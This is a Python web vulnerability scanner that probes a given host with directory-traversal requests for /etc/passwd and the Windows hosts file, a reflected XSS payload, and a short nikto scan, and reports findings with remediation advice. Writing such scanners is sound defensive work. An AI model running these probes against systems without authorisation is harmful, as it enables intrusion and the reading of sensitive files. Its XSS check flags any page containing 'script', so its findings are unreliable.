import sys
import subprocess
import time
import os

def test_web_exploits(target, port):
    protocol = "https" if port == "443" else "http"
    url = f"{protocol}://{target}:{port}"
    
    print(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] Starting web exploit checks for {url}")
    
    vulnerabilities_found = []
    
    try:
        print("Testing directory traversal...")
        
        traversal_cmd = [
            "curl", "-s", "-k", "--max-time", "5",
            f"{url}/../../etc/passwd"
        ]
        
        result = subprocess.run(traversal_cmd, capture_output=True, text=True, timeout=10)
        if result.stdout and ("root:" in result.stdout or "daemon:" in result.stdout):
            vuln_info = f"WEB-TRAVERSAL-VULNERABLE: {url} - Directory traversal to /etc/passwd successful"
            vulnerabilities_found.append(vuln_info)
            print(vuln_info)
            print(f"WEB-TRAVERSAL-DETAILS: Path traversal vulnerability detected")
            print(f"WEB-TRAVERSAL-IMPACT: File system access possible")
            print(f"WEB-TRAVERSAL-RECOMMENDATION: Implement proper input validation")
        
        traversal_cmd_win = [
            "curl", "-s", "-k", "--max-time", "5",
            f"{url}/../../../windows/system32/drivers/etc/hosts"
        ]
        
        result = subprocess.run(traversal_cmd_win, capture_output=True, text=True, timeout=10)
        if result.stdout and ("localhost" in result.stdout or "127.0.0.1" in result.stdout):
            vuln_info = f"WEB-TRAVERSAL-VULNERABLE: {url} - Directory traversal to Windows hosts file successful"
            vulnerabilities_found.append(vuln_info)
            print(vuln_info)
        
        print("Testing XSS...")
        xss_cmd = [
            "curl", "-s", "-k", "--max-time", "5",
            f"{url}?test=<script>alert('XSS')</script>"
        ]
        
        result = subprocess.run(xss_cmd, capture_output=True, text=True, timeout=10)
        if result.stdout and "script" in result.stdout.lower():
            vuln_info = f"WEB-XSS-VULNERABLE: {url} - Cross-site scripting vulnerability detected"
            vulnerabilities_found.append(vuln_info)
            print(vuln_info)
            print(f"WEB-XSS-DETAILS: Reflected XSS vulnerability found")
            print(f"WEB-XSS-IMPACT: Client-side code execution possible")
            print(f"WEB-XSS-RECOMMENDATION: Implement output encoding and CSP")
        
        if subprocess.run(["command", "-v", "nikto"], capture_output=True).returncode == 0:
            print("Running limited nikto scan...")
            nikto_cmd = [
                "nikto",
                "-host", url,
                "-timeout", "10",
                "-maxtime", "30s",
                "-Format", "txt"
            ]
            
            result = subprocess.run(nikto_cmd, capture_output=True, text=True, timeout=35)
            if result.stdout:
                nikto_lines = result.stdout.split('\n')[:20] 
                for line in nikto_lines:
                    if '+' in line and any(vuln_word in line.lower() for vuln_word in ['vulnerable', 'outdated', 'exposed', 'cgi']):
                        vuln_info = f"WEB-NIKTO-FINDING: {line.strip()}"
                        vulnerabilities_found.append(vuln_info)
                        print(vuln_info)
        
        print(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] Web exploit checks completed for {url}")
        
        if not vulnerabilities_found:
            print(f"WEB-EXPLOITS-SAFE: {url} - No web vulnerabilities detected")
        
        return vulnerabilities_found
        
    except Exception as e:
        print(f"WEB-EXPLOITS-ERROR: {url} - {str(e)}")
        return [f"Web exploit testing failed: {str(e)}"]

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python3 web_exploit_test.py <target> <port>")
        sys.exit(1)
    
    target = sys.argv[1]
    port = sys.argv[2]
    
    test_web_exploits(target, port)
